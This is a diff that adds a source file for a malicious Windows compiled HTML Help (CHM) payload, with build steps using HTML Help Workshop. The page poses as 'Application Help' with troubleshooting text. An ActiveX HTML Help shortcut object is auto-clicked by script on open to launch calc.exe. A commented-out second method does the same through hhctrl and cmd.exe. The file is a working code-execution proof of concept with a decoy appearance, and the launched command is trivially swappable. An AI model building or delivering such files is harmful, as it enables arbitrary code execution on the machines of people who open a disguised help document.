@@ -1,0 +1,49 @@
+<!--
+  CHM Payload Source — Pop calc.exe
+
+  Build Steps:
+  1. Install HTML Help Workshop (htmlhelp.exe from Microsoft)
+  2. Create project file (.hhp) — see chm_project.hhp below
+  3. Compile: hhc.exe chm_project.hhp
+
+  Test: Double-click the .chm file, or open from target application's help menu
+-->
+
+<!-- METHOD 1: ActiveX Command Execution via shortcut -->
+<html>
+<head><title>Help Documentation</title></head>
+<body>
+<h1>Application Help</h1>
+<p>Click below for troubleshooting assistance:</p>
+
+<!-- Object shortcut method -->
+<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+  <PARAM name="Command" value="ShortCut">
+  <PARAM name="Button" value="Bitmap::shortcut">
+  <PARAM name="Item1" value=",calc.exe,">
+  <PARAM name="Item2" value="273,1,1">
+</OBJECT>
+
+<script>
+  x.Click();
+</script>
+
+</body>
+</html>
+
+
+<!-- METHOD 2: Using hhctrl.ocx -->
+<!--
+<html>
+<head><title>Help</title></head>
+<body>
+<OBJECT id=ocx classid="clsid:52a2aaae-085d-4187-97ea-8c30db990436" width=1 height=1>
+  <PARAM name="Command" value="ShortCut">
+  <PARAM name="Button" value="Bitmap:shortcut">
+  <PARAM name="Item1" value=",cmd.exe, /c calc.exe">
+  <PARAM name="Item2" value="273,1,1">
+</OBJECT>
+<script>ocx.Click();</script>
+</body>
+</html>
+-->
